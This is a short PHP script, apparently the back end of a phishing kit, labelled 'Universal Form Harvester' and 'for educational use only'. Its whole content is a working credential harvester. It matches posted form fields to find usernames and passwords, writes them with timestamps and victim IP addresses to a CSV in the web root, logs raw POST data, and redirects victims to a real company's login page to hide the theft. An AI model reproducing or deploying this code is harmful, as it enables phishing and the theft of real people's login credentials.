<?php
// Universal Form Harvester - Auto-generated
// Author: You
// For educational use only

error_reporting(0);
date_default_timezone_set("UTC");

// Target CSV path on your local machine
$csv_path = "/var/www/html/credentials.csv";
$debug_log = "/home/kali/Desktop/My_Scripts/Phishing/Templates/debug_dump.log";

// Initialize values
$username = "UNKNOWN";
$password = "UNKNOWN";

// Try matching common username and password patterns
foreach ($_POST as $key => $value) {
    if ($username === "UNKNOWN" && preg_match('/\b(user(name)?|uname|login|email|id|un)\b/i', $key)) {
        $username = is_array($value) ? json_encode($value) : trim($value);
    }
    if ($password === "UNKNOWN" && preg_match('/\b(pass(word)?|pw|pword)\b/i', $key)) {
        $password = is_array($value) ? json_encode($value) : trim($value);
    }
}

// Timestamp and IP
$timestamp = date("Y-m-d H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

// CSV line format
$csv_line = "\"$username\",\"$password\",\"$timestamp\",\"$ip\"\n";

// Write to CSV file
file_put_contents($csv_path, $csv_line, FILE_APPEND);

// Save raw POST data for debugging (optional)
file_put_contents($debug_log, print_r($_POST, true), FILE_APPEND);

// Redirect user to real site
header("Location: https://cs.allegronet.co.il/Login.jsp?navLanguage=en-US");
exit();
?>
